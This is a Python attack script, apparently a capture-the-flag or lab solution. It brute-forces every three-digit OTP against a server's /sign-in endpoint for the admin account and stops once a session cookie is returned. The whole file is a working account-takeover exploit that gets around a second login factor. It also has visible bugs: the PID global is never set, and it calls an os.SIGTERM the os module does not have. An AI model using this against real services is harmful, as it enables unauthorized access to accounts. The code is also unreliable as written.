#!/usr/bin/env python3

import sys
import os
from threading import Thread, BoundedSemaphore, Lock

import requests as rq


SERVER = ''
PASSWORD = ''
PID = None


def bruteforce(otp):
    global sema
    with sema:
        print('Trying OTP = {}'.format(otp))
        r = rq.post(
            SERVER + '/sign-in',
            data = {'username': 'admin', 'password': PASSWORD, 'otp': otp},
        )
        print('{}: {}'.format(otp, r.cookies))
        if 'session_id' in r.cookies.get_dict():
            print('FOUND! ' + r.cookies.get_dict()['session_id'])
            sys.stdout.flush()
            os.kill(PID, os.SIGTERM)


THREADS = 4
sema = BoundedSemaphore(value=THREADS)


def main():
    global SERVER, PASSWORD, PID
    pid = os.getpid()
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} <server> <admin_password>')
        sys.exit(1)
    SERVER, PASSWORD = sys.argv[1:3]
    for i in range(1000):
        otp = str(i).zfill(3)
        Thread(target=bruteforce.__get__(otp)).start()


if __name__ == '__main__':
    main()
